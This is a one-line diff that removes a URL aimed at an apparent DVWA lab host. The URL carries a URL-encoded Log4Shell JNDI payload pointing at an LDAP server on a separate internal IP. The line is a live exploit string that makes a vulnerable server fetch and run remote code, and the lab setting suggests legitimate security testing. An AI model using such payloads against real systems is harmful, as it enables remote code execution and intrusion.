@@ -1,1 +1,0 @@
-http://dvwa.kt66.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D
